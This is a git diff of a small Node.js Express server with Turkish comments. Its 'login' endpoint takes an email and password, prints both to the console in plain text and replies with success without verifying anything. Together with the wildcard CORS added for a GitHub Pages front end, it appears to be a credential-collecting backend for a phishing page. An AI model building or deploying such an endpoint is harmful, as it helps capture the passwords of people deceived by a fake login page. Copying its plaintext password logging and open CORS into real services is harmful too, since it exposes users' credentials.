@@ -3,26 +3,26 @@ const cors = require("cors");
 
 const app = express();
 
-// 🔹 CORS açıyoruz, GitHub Pages ile uyumlu olsun
-app.use(cors({
-  origin: "*" // deneme için tüm domainlere izin verir
-}));
-
+/* MIDDLEWARE */
+app.use(cors());
 app.use(express.json());
 
-// POST endpoint
+/* ROOT TEST */
+app.get("/", (req, res) => {
+  res.send("Server çalışıyor ✅");
+});
+
+/* LOGIN ENDPOINT */
 app.post("/send", (req, res) => {
   const { email, password } = req.body;
 
-  console.log("Gelen veri:");
-  console.log("Email:", email);
-  console.log("Şifre:", password);
+  console.log("Gelen veri:", email, password);
 
-  res.sendStatus(200);
+  res.status(200).json({ success: true });
 });
 
-// Render uyumlu port
+/* PORT */
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log("Server çalışıyor:", PORT);
+  console.log("Server aktif:", PORT);
 });
